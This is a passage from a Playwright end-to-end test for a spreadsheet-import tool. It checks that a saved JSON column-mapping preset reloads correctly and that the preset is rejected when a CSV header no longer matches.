  await panel.locator('input[type="file"][accept*=".json"]').setInputFiles({
    name: presetDownload.suggestedFilename(),
    mimeType: 'application/json',
    buffer: Buffer.from(presetText, 'utf8')
  })
  await expect(panel.getByText('Mapping preset loaded.')).toBeVisible()
  await expect(reuseField('process_id').getByRole('combobox')).toHaveValue('Case Ref')
  await expect(reuseField('step_id').getByRole('combobox')).toHaveValue('Node Ref')
  await expect(reuseField('order').getByRole('combobox')).toHaveValue('Sort Rank')
  await expect(reuseField('type').getByRole('combobox')).toHaveValue('Work Class')
  await expect(reuseField('name_en').getByRole('combobox')).toHaveValue('Title English')
  await expect(reuseField('name_ar').getByRole('combobox')).toHaveValue('Title Arabic')
  await expect(reuseField('inputs_en').getByRole('combobox')).toHaveValue('Input Items')
  await expect(panel.getByLabel('List delimiters')).toHaveValue('|')
  await expect(panel.getByLabel('Flow inference')).toHaveValue('numeric-order')
  await panel.getByLabel('Default process name (English)').fill('Preset reuse')
  await panel.getByLabel('Default process name (Arabic)').fill('إعادة استخدام الإعداد')
  await mandatorySpreadsheetReview(panel)
  await expect(panel.getByText('No workbook issues found.')).toBeVisible()
  await expect(panel.getByText('3 nodes')).toBeVisible()
  await expect(panel.getByText('2 flows')).toBeVisible()

  await panel.getByRole('button', { name: 'Start over' }).click()
  const mismatchedCsv = reuseCsv.replace('Node Ref', 'Different Node Header')
  await mandatorySpreadsheetUpload(
    panel,
    {
      name: 'mandatory-preset-mismatch.csv',
      mimeType: 'text/csv',
      buffer: Buffer.from(mismatchedCsv, 'utf8')
    },
    'ordinary'
  )
  await panel.locator('input[type="file"][accept*=".json"]').setInputFiles({
    name: presetDownload.suggestedFilename(),
    mimeType: 'application/json',
    buffer: Buffer.from(presetText, 'utf8')
  })
  await expect(
    panel.getByRole('alert').filter({ hasText: 'invalid-mapping-preset' })
  ).toContainText('invalid-mapping-preset')
  await expect(panel.getByText('Mapping preset loaded.')).toHaveCount(0)
})
